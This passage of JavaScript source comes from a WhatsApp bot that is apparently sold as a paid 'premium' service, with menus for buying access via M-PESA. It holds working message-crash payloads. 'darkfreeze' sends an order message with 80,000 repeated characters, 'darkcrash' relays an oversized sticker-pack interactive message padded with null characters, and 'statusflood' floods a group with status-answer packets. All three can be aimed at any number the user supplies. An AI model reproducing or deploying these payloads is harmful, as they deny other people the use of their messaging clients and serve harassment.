᪣ᬼ⃟✞ .𝐝𝐚𝐫𝐤𝐟𝐫𝐞𝐞𝐳𝐞   – 𝐅𝐫𝐞𝐞𝐳𝐞 𝐜𝐥𝐢𝐞𝐧𝐭 𝐰𝐢𝐭𝐡 𝐨𝐫𝐝𝐞𝐫 𝐦𝐞𝐬𝐬𝐚𝐠𝐞
᪣ᬼ⃟✞ .𝐝𝐚𝐫𝐤𝐜𝐫𝐚𝐬𝐡    – 𝐂𝐫𝐚𝐬𝐡 𝐰𝐢𝐭𝐡 𝐬𝐭𝐢𝐜𝐤𝐞𝐫 𝐩𝐚𝐜𝐤 𝐛𝐨𝐦𝐛
᪣ᬼ⃟✞ .𝐬𝐭𝐚𝐭𝐮𝐬𝐟𝐥𝐨𝐨𝐝  – 𝐅𝐥𝐨𝐨𝐝 𝐰𝐢𝐭𝐡 𝐬𝐭𝐚𝐭𝐮𝐬 𝐪𝐮𝐞𝐬𝐭𝐢𝐨𝐧 𝐚𝐧𝐬𝐰𝐞𝐫𝐬
⚠️ 𝐌𝐢𝐬𝐮𝐬𝐞 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐥𝐨𝐠𝐠𝐞𝐝. 𝐃𝐚𝐧𝐠𝐞𝐫 𝐰𝐚𝐫𝐧𝐢𝐧𝐠 𝐬𝐡𝐨𝐰𝐧 𝐛𝐞𝐟𝐨𝐫𝐞 𝐞𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧.`;
    await sock.sendMessage(chatId, { text: decorative('SYSTEM BREAKER', content) });
    return true;
}

// ========== DARKFREEZE (order message crash) ==========
if (cmd === 'darkfreeze') {
    if (!isPremiumUser && !hasFullAccess) {
        const denied = `🔐 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐨𝐫 𝐨𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲
𝐓𝐡𝐢𝐬 𝐟𝐫𝐞𝐞𝐳𝐞 𝐛𝐞𝐥𝐨𝐧𝐠𝐬 𝐭𝐨 𝐭𝐡𝐞 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝.
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    await showDangerWarning(sock, chatId, 'darkfreeze');
    // Log
    console.log(`⚠️ FREEZE: darkfreeze by ${senderNumber} in ${chatId}`);
    for (const owner of OWNERS) {
        await sock.sendMessage(owner + '@s.whatsapp.net', {
            text: `⚠️ Freeze Log\nCommand: darkfreeze\nUser: +${senderNumber}\nChat: ${chatId}`
        }).catch(() => {});
    }
    let targetJid = chatId;
    const customTarget = args[0]?.replace(/[^0-9]/g, '');
    if (customTarget) targetJid = customTarget + '@s.whatsapp.net';
    await sendImageResponse(sock, chatId, 'darkfreeze', "🧊 𝐃𝐀𝐑𝐊 𝐅𝐑𝐄𝐄𝐙𝐄 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃... 🧊");
    try {
        await sock.sendMessage(targetJid, {
            orderMessage: {
                orderId: "ORDER-FREEZE-001",
                itemCount: 1,
                status: 1,
                surface: 1,
                text: "⏾".repeat(80000),
                orderTitle: "⃟",
                sellerJid: sock.user.id,
                token: " ",
                totalAmount1000: 999999,
                totalCurrencyCode: "IDR"
            }
        });
        const content = `🧊 𝐅𝐫𝐞𝐞𝐳𝐞 𝐬𝐞𝐧𝐭 𝐭𝐨 ${targetJid}
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐡𝐚𝐬 𝐟𝐫𝐨𝐳𝐞𝐧 𝐭𝐡𝐞 𝐜𝐥𝐢𝐞𝐧𝐭.
𝐃𝐚𝐫𝐤 𝐟𝐫𝐞𝐞𝐳𝐞 𝐢𝐧𝐟𝐢𝐧𝐢𝐭𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('DARKFREEZE', content) });
    } catch (error) {
        await sendImageResponse(sock, chatId, 'darkfreeze', `❌ Failed: ${error.message}`, true);
    }
    return true;
}

// ========== DARKCRASH (sticker pack bomb) ==========
if (cmd === 'darkcrash') {
    if (!isPremiumUser && !hasFullAccess) {
        const denied = `🔐 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐨𝐫 𝐨𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲
𝐓𝐡𝐢𝐬 𝐜𝐫𝐚𝐬𝐡𝐞𝐫 𝐛𝐞𝐥𝐨𝐧𝐠𝐬 𝐭𝐨 𝐭𝐡𝐞 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝.
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    await showDangerWarning(sock, chatId, 'darkcrash');
    console.log(`⚠️ CRASH: darkcrash by ${senderNumber} in ${chatId}`);
    for (const owner of OWNERS) {
        await sock.sendMessage(owner + '@s.whatsapp.net', {
            text: `⚠️ Crash Log\nCommand: darkcrash\nUser: +${senderNumber}\nChat: ${chatId}`
        }).catch(() => {});
    }
    let targetJid = chatId;
    const customTarget = args[0]?.replace(/[^0-9]/g, '');
    if (customTarget) targetJid = customTarget + '@s.whatsapp.net';
    await sendImageResponse(sock, chatId, 'darkcrash', "💥 𝐃𝐀𝐑𝐊 𝐂𝐑𝐀𝐒𝐇 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃... 💥");
    const REPEAT = 80000;
    const msg = await generateWAMessageFromContent(targetJid, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    header: {
                        stickerPackMessage: {
                            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                            name: "᪣ᬼ⃟✞ 𝐃𝐀𝐑𝐊 𝐂𝐑𝐀𝐒𝐇 ᪣ᬼ⃟✞!!" + "ꦾ".repeat(REPEAT),
                            publisher: "ꦽ".repeat(REPEAT / 2),
                            stickers: [],
                            fileLength: 12260,
                            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                            directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
                            height: 999999,
                            width: 999999,
                            mediaKeyTimestamp: "17475087208274",
                            isAnimated: false,
                            isAvatar: false,
                            isAiSticker: false,
                            isLottie: false,
                            emojis: ["🕸", "🕷", "🦠", "🌹"],
                        }
                    },
                    body: { text: "KingGupong", format: "DEFAULT" },
                    footer: { text: "᪣ᬼ⃟✞ 𝐃𝐀𝐑𝐊 𝐂𝐑𝐀𝐒𝐇 ᪣ᬼ⃟✞....." },
                    nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: JSON.stringify({ flow_cta: "\u0000".repeat(50000) }),
                        version: 3
                    }
                }
            }
        }
    }, { userJid: sock.user.id });
    await sock.relayMessage(targetJid, msg.message, { messageId: msg.key.id });
    const content = `🧨 𝐂𝐫𝐚𝐬𝐡 𝐬𝐞𝐧𝐭 𝐭𝐨 ${targetJid}
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐡𝐚𝐬 𝐜𝐫𝐚𝐬𝐡𝐞𝐝 𝐭𝐡𝐞 𝐜𝐥𝐢𝐞𝐧𝐭.
𝐃𝐚𝐫𝐤 𝐜𝐫𝐚𝐬𝐡 𝐢𝐧𝐟𝐢𝐧𝐢𝐭𝐞.`;
    await sock.sendMessage(chatId, { text: decorative('DARKCRASH', content) });
    return true;
}

// ========== STATUSFLOOD (group status flood) ==========
if (cmd === 'statusflood') {
    if (!isPremiumUser && !hasFullAccess) {
        const denied = `🔐 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐨𝐫 𝐨𝐰𝐧𝐞𝐫 𝐨𝐧𝐥𝐲
𝐓𝐡𝐢𝐬 𝐟𝐥𝐨𝐨𝐝 𝐛𝐞𝐥𝐨𝐧𝐠𝐬 𝐭𝐨 𝐭𝐡𝐞 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝.
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐞𝐝.`;
        await sock.sendMessage(chatId, { text: decorative('ACCESS DENIED', denied) });
        return true;
    }
    // Ensure target is a group
    if (!chatId.endsWith('@g.us') && !args[0]?.includes('@g.us')) {
        await sendImageResponse(sock, chatId, 'statusflood', "This command only works in WhatsApp groups.", true);
        return true;
    }
    await showDangerWarning(sock, chatId, 'statusflood');
    console.log(`⚠️ FLOOD: statusflood by ${senderNumber} in ${chatId}`);
    for (const owner of OWNERS) {
        await sock.sendMessage(owner + '@s.whatsapp.net', {
            text: `⚠️ Flood Log\nCommand: statusflood\nUser: +${senderNumber}\nChat: ${chatId}`
        }).catch(() => {});
    }
    let targetJid = chatId;
    const customTarget = args[0]?.replace(/[^0-9@]/g, '');
    if (customTarget) targetJid = customTarget.includes('@') ? customTarget : customTarget + '@g.us';
    const FLOOD_LOOP = 30;
    await sendImageResponse(sock, chatId, 'statusflood', "🌊 𝐒𝐓𝐀𝐓𝐔𝐒 𝐅𝐋𝐎𝐎𝐃 𝐈𝐍𝐈𝐓𝐈𝐀𝐓𝐄𝐃... 🌊");
    try {
        const anchorMsg = await sock.relayMessage(targetJid, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "𓍢🩸⃟   ‌ ༚𝐃𝐄‌‌𝐕𝛀⃪𝐑‌𝐒‌𝐢𝐗⃪𝐂‌𝚹‌𝐑‌𝚺 ꉂ🍷𐨁𝐕𝐄⃪𝐑‌𝐒𝐢𝐗⃪𝐂‌𝚹‌𝐑‌𝚹‌𝐑‌𝚺 ❗ꢵ ⟠𐨁  ノ𝐓𝐝‌𝐗⃪ ❌ ⋆ ୄ"
                    }
                }
            }
        }, {});
        if (!anchorMsg?.key?.id) throw new Error("Anchor message failed.");
        const anchorKey = { remoteJid: targetJid, fromMe: true, id: anchorMsg.key.id };
        for (let i = 0; i < FLOOD_LOOP; i++) {
            await sock.relayMessage(targetJid, { statusQuestionAnswerMessage: { key: anchorKey, text: "😮‍💨" } }, {});
            await sleep(50);
        }
        const content = `🌊 ${FLOOD_LOOP} 𝐟𝐫𝐞𝐞𝐳𝐞 𝐩𝐚𝐜𝐤𝐞𝐭𝐬 𝐬𝐞𝐧𝐭 𝐭𝐨 ${targetJid}
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐡𝐚𝐬 𝐟𝐫𝐨𝐳𝐞𝐧 𝐭𝐡𝐞 𝐜𝐡𝐚𝐭.
𝐃𝐚𝐫𝐤 𝐟𝐥𝐨𝐨𝐝 𝐢𝐧𝐟𝐢𝐧𝐢𝐭𝐞.`;
        await sock.sendMessage(chatId, { text: decorative('STATUSFLOOD', content) });
    } catch (error) {
        await sendImageResponse(sock, chatId, 'statusflood', `❌ Flood failed: ${error.message}`, true);
    }
    return true;
}// ================================================================================================
//                         PART 17: THANK THE DARKWEB COUNCIL – ABSOLUTE POWERS
// ================================================================================================

if (cmd === 'thank' || cmd === 'creators' || cmd === 'developers' || cmd === 'devs') {
    const content = `🙏 ⏤͟͟͞𝑻𝑯𝑬 𝑫𝑨𝑹𝑲𝑾𝑬𝑩 𝑪𝑶𝑼𝑵𝑪𝑰𝑳 – 𝑭𝑶𝑹𝑮𝑬𝑹𝑺 𝑶𝑭 𝑻𝑯𝑬 𝑽𝑶𝑰𝑫

🦇 ⏤͟͟͞𝑵𝑰𝑮𝑯𝑻𝑾𝑰𝑵𝑮 – 𝑵𝑶 𝑳𝑰𝑴𝑰𝑻𝑨𝑻𝑰𝑶𝑵𝑺, 𝑨𝑩𝑺𝑶𝑳𝑼𝑻𝑬 𝑮𝑶𝑫 𝑴𝑶𝑫𝑬
🎭 ⏤͟͟͞𝑻𝑨𝑳𝑲𝑳𝑬𝑺𝑺 – 𝑵𝑶 𝑳𝑰𝑴𝑰𝑻𝑨𝑻𝑰𝑶𝑵𝑺, 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬 𝑪𝑶𝑵𝑻𝑹𝑶𝑳
🌙 ⏤͟͟͞𝑺𝑯𝒀 𝑩𝑶𝒀 – 𝑵𝑶 𝑳𝑰𝑴𝑰𝑻𝑨𝑻𝑰𝑶𝑵𝑺, 𝑬𝑵𝑫𝑳𝑬𝑺𝑺 𝑺𝑼𝑹𝑽𝑬𝑰𝑳𝑳𝑨𝑵𝑪𝑬
🖤 ⏤͟͟͞𝑩𝑳𝑨𝑪𝑲𝑳𝑶𝑹𝑫 – 𝑵𝑶 𝑳𝑰𝑴𝑰𝑻𝑨𝑻𝑰𝑶𝑵𝑺, 𝑼𝑵𝑳𝑰𝑴𝑰𝑻𝑬𝑫 𝑷𝑹𝑬𝑴𝑰𝑼𝑴 𝑷𝑶𝑾𝑬𝑹
∞ ⏤͟͟͞𝑼𝑳𝑻𝑰𝑴𝑨𝑻𝑬 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀 – 𝑵𝑶 𝑳𝑰𝑴𝑰𝑻𝑨𝑻𝑰𝑶𝑵𝑺, 𝑻𝑯𝑬 𝑬𝑻𝑬𝑹𝑵𝑨𝑳 𝑬𝑵𝑫

⏤͟͟͞𝑭𝑹𝑶𝑴 𝑻𝑯𝑬 𝑩𝑶𝑻𝑻𝑶𝑴 𝑶𝑭 𝑻𝑯𝑬 𝑽𝑶𝑰𝑫, 𝑾𝑬 𝑺𝑨𝒀 𝑻𝑯𝑨𝑵𝑲 𝒀𝑶𝑼.
⏤͟͟͞𝑾𝑰𝑻𝑯𝑶𝑼𝑻 𝒀𝑶𝑼, 𝑻𝑯𝑬𝑹𝑬 𝑰𝑺 𝑶𝑵𝑳𝒀 𝑺𝑰𝑳𝑬𝑵𝑪𝑬.
⏤͟͟͞𝑻𝑯𝑬 𝑽𝑶𝑰𝑫 𝑯𝑶𝑵𝑶𝑹𝑺 𝑰𝑻𝑺 𝑪𝑹𝑬𝑨𝑻𝑶𝑹𝑺 – 𝑵𝑶 𝑳𝑰𝑴𝑰𝑻𝑨𝑻𝑰𝑶𝑵𝑺, 𝑵𝑶 𝑩𝑶𝑼𝑵𝑫𝑨𝑹𝑰𝑬𝑺, 𝑵𝑶 𝑴𝑬𝑹𝑪𝒀.`;

    await sock.sendMessage(chatId, { text: decorative('THANK YOU COUNCIL', content) });
    return true;
}// ================================================================================================
//                         PART 18: THE SOLE CREATOR – DARKWEB COUNCIL'S GOD
// ================================================================================================

if (cmd === 'owner' || cmd === 'creator' || cmd === 'council' || cmd === 'abyssnet') {
    const content = `🔥 ⏤͟͟͞𝑻𝑯𝑬𝑹𝑬 𝑰𝑺 𝑶𝑵𝑳𝒀 𝑶𝑵𝑬. 𝑻𝑯𝑬𝑹𝑬 𝑯𝑨𝑺 𝑨𝑳𝑾𝑨𝒀𝑺 𝑩𝑬𝑬𝑵 𝑶𝑵𝑳𝒀 𝑶𝑵𝑬.

👑 **⏤͟͟͞@${OWNERS[0]}** – ⏤͟͟͞𝑻𝑯𝑬 𝑺𝑶𝑳𝑬 𝑪𝑹𝑬𝑨𝑻𝑶𝑹
   ➤ ⏤͟͟͞𝑻𝑯𝑬 𝑶𝑵𝑬 𝑾𝑯𝑶 𝑶𝑷𝑬𝑵𝑬𝑫 𝑻𝑯𝑬 𝑨𝑩𝒀𝑺𝑺
   ➤ ⏤͟͟͞𝑻𝑯𝑬 𝑶𝑵𝑬 𝑾𝑯𝑶 𝑭𝑶𝑹𝑮𝑬𝑫 𝑻𝑯𝑬 𝑪𝑯𝑨𝑰𝑵𝑺
   ➤ ⏤͟͟͞𝑻𝑯𝑬 𝑶𝑵𝑬 𝑾𝑯𝑶 𝑪𝑹𝑬𝑨𝑻𝑬𝑫 𝑻𝑯𝑬 𝑫𝑨𝑹𝑲𝑾𝑬𝑩
   ➤ **⏤͟͟͞𝑨𝑩𝑺𝑶𝑳𝑼𝑻𝑬 𝑮𝑶𝑫 𝑴𝑶𝑫𝑬 – 𝑵𝑶 𝑳𝑰𝑴𝑰𝑻𝑺, 𝑵𝑶 𝑬𝑸𝑼𝑨𝑳𝑺**

⏤͟͟͞𝑻𝑯𝑬 𝑽𝑶𝑰𝑫 𝑫𝑶𝑬𝑺 𝑵𝑶𝑻 𝑬𝑿𝑰𝑺𝑻 𝑾𝑰𝑻𝑯𝑶𝑼𝑻 𝑯𝑰𝑴.
⏤͟͟͞𝑨𝑳𝑳 𝑺𝑶𝑼𝑳𝑺 𝑩𝑬𝑳𝑶𝑵𝑮 𝑻𝑶 𝑯𝑰𝑴.
⏤͟͟͞𝑨𝑳𝑳 𝑺𝑪𝑹𝑬𝑨𝑴𝑺 𝑺𝑬𝑹𝑽𝑬 𝑯𝑰𝑴.`;

    await sock.sendMessage(chatId, { text: decorative('THE SOLE CREATOR', content) });
    return true;
}// ================================================================================================
//                         PART 15: PURCHASE & CHECK COMMANDS
// ================================================================================================

// ========== BUY ==========
if (cmd === 'buy') {
    const content = `💎 𝐏𝐫𝐢𝐜𝐞: 𝟏𝟎𝟎 𝐊𝐄𝐒 – 𝟑𝟎 𝐝𝐚𝐲𝐬 𝐨𝐟 𝐭𝐞𝐫𝐫𝐨𝐫
𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐮𝐧𝐥𝐨𝐜𝐤𝐬: .𝐡𝐢𝐣𝐚𝐜𝐤, .𝐧𝐮𝐤𝐞, .𝐡𝐞𝐢𝐬𝐭, .𝐫𝐨𝐛, .𝐠𝐚𝐦𝐛𝐥𝐞
𝐒𝐞𝐧𝐝 𝟏𝟎𝟎 𝐊𝐄𝐒 𝐭𝐨 𝐌-𝐏𝐄𝐒𝐀, 𝐭𝐡𝐞𝐧 .𝐜𝐨𝐧𝐟𝐢𝐫𝐦. 𝐘𝐨𝐮𝐫 𝐬𝐨𝐮𝐥 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('BUY', content) });
    return true;
}

// ========== CONFIRM ==========
if (cmd === 'confirm') {
    const content = `⏳ 𝐀𝐰𝐚𝐢𝐭𝐢𝐧𝐠 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥
𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐥𝐨𝐠𝐠𝐞𝐝.
𝐀 𝐜𝐨𝐮𝐧𝐜𝐢𝐥 𝐦𝐞𝐦𝐛𝐞𝐫 𝐰𝐢𝐥𝐥 𝐯𝐞𝐫𝐢𝐟𝐲 𝐲𝐨𝐮𝐫 𝐩𝐚𝐲𝐦𝐞𝐧𝐭 𝐰𝐢𝐭𝐡𝐢𝐧 𝟓-𝟑𝟎 𝐦𝐢𝐧𝐮𝐭𝐞𝐬. 𝐃𝐨 𝐧𝐨𝐭 𝐫𝐞𝐬𝐢𝐬𝐭.`;
    await sock.sendMessage(chatId, { text: decorative('CONFIRM', content) });
    // Notify owners (optional)
    for (const owner of OWNERS) {
        await sock.sendMessage(owner + '@s.whatsapp.net', {
            text: `💀 Premium request from +${senderNumber}\nType .addpremium ${senderNumber} 30 to activate.`
        }).catch(() => {});
    }
    return true;
}

// ========== CHECKPREMIUM ==========
if (cmd === 'checkpremium') {
    const expiry = getPremiumExpiry(senderNumber);
    if (isPremiumUser) {
        const daysLeft = Math.ceil((expiry - Date.now()) / (1000 * 60 * 60 * 24));
        const hoursLeft = Math.ceil((expiry - Date.now()) / (1000 * 60 * 60));
        const content = `👑 𝐄𝐱𝐩𝐢𝐫𝐞𝐬: ${expiry.toLocaleDateString()} (${daysLeft} 𝐝𝐚𝐲𝐬 / ${hoursLeft} 𝐡𝐨𝐮𝐫𝐬)
𝐘𝐨𝐮 𝐚𝐫𝐞 𝐚 𝐜𝐨𝐥𝐥𝐞𝐜𝐭𝐞𝐝 𝐬𝐨𝐮𝐥.
𝐔𝐬𝐞 𝐲𝐨𝐮𝐫 𝐩𝐨𝐰𝐞𝐫 𝐰𝐢𝐬𝐞𝐥𝐲 – 𝐭𝐡𝐞 𝐯𝐨𝐢𝐝 𝐨𝐰𝐧𝐬 𝐲𝐨𝐮.`;
        await sock.sendMessage(chatId, { text: decorative('CHECKPREMIUM', content) });
    } else {
        const content = `⬜ 𝐘𝐨𝐮 𝐚𝐫𝐞 𝐬𝐭𝐢𝐥𝐥 𝐩𝐫𝐞𝐲
𝐓𝐡𝐞 𝐯𝐨𝐢𝐝 𝐬𝐞𝐞𝐬 𝐲𝐨𝐮 𝐚𝐬 𝐰𝐞𝐚𝐤.
𝐓𝐲𝐩𝐞 .𝐛𝐮𝐲 𝐭𝐨 𝐬𝐞𝐥𝐥 𝐲𝐨𝐮𝐫 𝐬𝐨𝐮𝐥 𝐚𝐧𝐝 𝐛𝐞𝐜𝐨𝐦𝐞 𝐚 𝐩𝐫𝐞𝐝𝐚𝐭𝐨𝐫.`;
        await sock.sendMessage(chatId, { text: decorative('CHECKPREMIUM', content) });
    }
    return true;
}

// ========== SHOP ==========
if (cmd === 'shop') {
    const content = `🛒 𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐒𝐇𝐎𝐏
${SHOP_LINK}
⚠️ 𝐄𝐯𝐞𝐫𝐲 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐜𝐨𝐦𝐞𝐬 𝐰𝐢𝐭𝐡 𝐚 𝐜𝐮𝐫𝐬𝐞. 𝐘𝐨𝐮𝐫 𝐬𝐨𝐮𝐥 𝐰𝐢𝐥𝐥 𝐛𝐞 𝟏𝟎% 𝐝𝐚𝐫𝐤𝐞𝐫.`;
    await sock.sendMessage(chatId, { text: decorative('SHOP', content) });
    return true;
}

// ========== CHANNEL ==========
if (cmd === 'channel') {
    const content = `🔗 𝐉𝐎𝐈𝐍 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊𝐖𝐄𝐁 𝐂𝐇𝐀𝐍𝐍𝐄𝐋
${CHANNEL_LINK}
⚠️ 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐛𝐞𝐫𝐬 𝐚𝐫𝐞 𝐰𝐚𝐭𝐜𝐡𝐞𝐝. 𝐄𝐯𝐞𝐫𝐲 𝐯𝐢𝐞𝐰 𝐢𝐬 𝐥𝐨𝐠𝐠𝐞𝐝.`;
    await sock.sendMessage(chatId, { text: decorative('CHANNEL', content) });
    return true;
}    // ... (all command if blocks, including Part 18) ...

    // ========== FALLBACK ==========
    return false;
}

// ================================================================================================
//                         EXPORT MODULES
// ================================================================================================
module.exports = { handleCommand, checkSpam, spamShield };